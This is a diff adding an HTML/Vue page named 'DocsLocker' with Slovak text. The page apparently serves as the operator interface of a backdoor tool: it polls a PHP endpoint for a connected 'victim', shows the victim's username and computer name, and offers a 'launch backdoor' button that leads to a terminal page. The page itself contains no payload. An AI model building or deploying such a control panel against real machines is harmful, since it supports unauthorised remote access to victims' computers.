@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>DocsLocker</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css" integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+
+    <link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/favicons/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="/favicons/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="/favicons/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/favicons/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/favicons/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="/favicons/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    <link rel="manifest" href="/favicons/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/favicons/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+
+    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+    
+    <style>
+        .fix-height {
+            height: 7rem;
+        }
+        .fade-enter-active, .fade-leave-active {
+            transition: opacity .5s;
+        }
+        .fade-enter, .fade-leave-to /* .fade-leave-active below version 2.1.8 */ {
+            opacity: 0;
+        }
+        [v-cloak] {
+            display: none;
+        }
+        .d-none-temp {
+            display: none;
+        }
+    </style>
+    
+</head>
+<body>
+    
+    <div class="container d-flex" id="app" style="height: 100vh;">
+        <div class="row w-100 align-self-center justify-content-center">
+            <!-- <div class="col-12 fix-height">
+                <div class="text-center">
+                                            
+                </div>
+            </div> -->
+            <div class="col-12">
+                <div class="text-center">    
+                    
+                    <h1 id="success" class="display-1 text-primary d-none-temp">✓</h1>
+                    
+                    <div id="loading" class="spinner-border text-primary" role="status" style="width: 5rem; height: 5rem;" v-cloak></div>
+
+                    <h1 id="heading" class="display-4 mb-3" v-cloak>
+                            <i>{{ app_state }}</i>
+                    </h1>                    
+
+                    <h3 id="subject" class="d-none-temp" v-cloak>{{ username }}@{{ computername }}</h3>                        
+
+                    <button id="button" v-on:click="launch" class="btn btn-primary btn-lg mt-2 d-none-temp" v-cloak>Spustiť backdooor</button>
+
+                </div>
+                
+            </div>
+        </div>
+	</div>
+    
+    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js" integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous"></script>    <meta charset="utf-8">
+    
+    <script>
+        var app = new Vue({
+			el: '#app',
+			data: {
+                app_state: "Vyhľadávam obeť...",
+                username: "",
+                computername: "",
+            },
+			created() {                
+                this.search_connection()    
+			},
+            methods: {
+                victim_found() {
+                    $("#loading").fadeOut(500)
+                    $("#heading").fadeOut(500, function() {
+                        app.app_state = "Obeť nájdená!"
+
+                        $("#heading").fadeIn(500)
+                        $("#subject").fadeIn(500)
+                        $("#button").fadeIn(500)
+                        $("#success").fadeIn(500)
+                    })
+                },
+                launch() {
+                    $("#loading").fadeOut(500)
+                    $("#subject").fadeOut(500)
+                    $("#button").fadeOut(500)
+                    $("#success").fadeOut(500)
+                    $("#heading").fadeOut(500, function() {
+                        app.app_state = "Spúštanie backdooru a pripájanie sa..."
+
+                        $("#heading").fadeIn(500)
+                        $("#loading").fadeIn(500)
+
+                        setTimeout(function(){
+                            $(location).attr("href", "terminal.html")
+                        }, 4000)
+                    })
+
+                    
+                },
+                search_connection() {
+                    fetch("api.php?action=check_connection")
+                        .then(response => response.json())
+                        .then(json => {
+                            if(json.connected) {
+                                this.username = json.username
+                                this.computername = json.computername
+
+                                setTimeout(this.victim_found, 5000)
+                            } else {
+                                setTimeout(this.search_connection, 500)
+                            }
+                        })  
+                }
+            }
+		});   
+    </script>
+    
+</body>
+</html>
